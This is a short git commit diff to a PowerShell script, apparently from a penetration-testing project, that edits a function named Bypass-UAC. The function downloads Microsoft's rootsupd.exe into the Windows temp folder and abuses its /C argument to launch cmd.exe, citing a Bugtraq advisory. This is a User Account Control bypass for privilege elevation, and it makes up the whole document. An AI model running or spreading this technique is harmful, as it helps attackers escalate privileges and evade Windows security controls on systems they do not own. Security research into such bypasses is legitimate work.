07f81a2ab7b27218c153404dcd366a8a27d02358
Pierre-Alexandre Braeken <pabraeken@gmail.com>
2015-09-12 21:35:11 -0400

    function

--- EYLR/Elevate-YourRightsMan.ps1
+++ EYLR/Elevate-YourRightsMan.ps1
@@ -1,10 +1,12 @@
 ﻿# http://seclists.org/bugtraq/2015/Sep/24
-function Bypass-UAC ($scriptPath, $logDirectoryPath) {      
+function Bypass-UAC () {      
     $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
     $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
      
     $webClient = new-object System.Net.WebClient 
     $webClient.DownloadFile($fileToDownload, $fileDownloaded) 
+    
+    $ok = "D:\GitRepo\PowerMemory\EYLR\rvkroots.exe"
       
     &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)" 
 }
